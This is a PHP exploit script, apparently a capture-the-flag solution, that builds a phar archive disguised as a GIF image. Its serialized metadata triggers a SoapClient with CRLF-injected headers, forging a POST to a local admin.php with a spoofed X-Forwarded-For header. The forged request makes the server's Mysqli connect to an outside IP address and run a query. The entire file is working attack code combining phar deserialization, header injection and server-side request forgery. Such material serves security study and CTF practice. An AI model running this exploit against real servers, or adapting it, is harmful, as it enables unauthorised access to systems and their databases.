<?php
class File{

    public $file_name;
    public $type;
    public $func = "SoapClient";

    function __construct($file_name){
        $this->file_name = $file_name;
    }
}


class Ad{

    public $clazz;
    public $func1;
    public $func2;
    public $instance;
    public $arg1;
    public $arg2;
        // $reflectionMethod = new ReflectionMethod('Mysqli', 'real_connect');
        // echo $reflectionMethod->invoke($sql, '106.14.153.173','root','123456','test','3306');

        // $reflectionMethod = new ReflectionMethod('Mysqli', 'query');
        // echo $reflectionMethod->invoke($sql, 'select 1');
}

$target = 'http://127.0.0.1/admin.php';
// $target = "http://106.14.153.173:2015";
$post_string = 'admin=1&clazz=Mysqli&func1=init&arg1=&func2=real_connect&arg2[0]=106.14.153.173&arg2[1]=root&arg2[2]=123&arg2[3]=test&arg2[4]=3306&func3=query&arg3=select%201&ip=106.14.153.173&port=2015';
$headers = array(
    'X-Forwarded-For: 127.0.0.1',
    );
// $b = new SoapClient(null,array("location" => $target,"user_agent"=>"zedd\r\nContent-Type: application/x-www-form-urlencoded\r\n".join("\r\n",$headers)."\r\nContent-Length: ".(string)strlen($post_string)."\r\n\r\n".$post_string,"uri"      => "aaab"));

$arr = array(null, array("location" => $target,"user_agent"=>"zedd\r\nContent-Type: application/x-www-form-urlencoded\r\n".join("\r\n",$headers)."\r\nContent-Length: ".(string)strlen($post_string)."\r\n\r\n".$post_string,"uri"      => "aaab"));

$phar = new Phar("1.phar"); //后缀名必须为phar
$phar->startBuffering();
// <?php __HALT_COMPILER();
$phar->setStub("GIF89a" . "<script language='php'>__HALT_COMPILER();</script>"); //设置stub
$o = new File($arr);
$phar->setMetadata($o); //将自定义的meta-data存入manifest
$phar->addFromString("test.txt", "test"); 
    //签名自动计算
$phar->stopBuffering();
rename("1.phar", "1.gif");
?>